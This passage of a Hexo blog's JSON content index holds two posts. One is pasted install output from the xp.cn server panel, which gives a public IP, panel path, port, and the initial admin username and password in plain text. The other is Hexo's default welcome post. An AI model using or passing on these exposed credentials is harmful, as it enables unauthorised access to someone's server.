1请用浏览器访问面板:外网:http://221.198.219.201:9080/B018F3内网:http://192.168.71.130:9080/B018F3系统初始账号:admin系统初始密码:Ng6ozncdWf官网:https://www.xp.cn如果使用的是云服务器，请至安全组开放9080端口如果使用ftp，请开放21以及30000-30050端口","categories":[],"tags":[]},{"title":"1","slug":"hello-world","date":"2022-03-12T06:33:07.878Z","updated":"2022-03-17T07:53:47.562Z","comments":true,"path":"2022/03/12/hello-world/","link":"","permalink":"http://example.com/2022/03/12/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[]}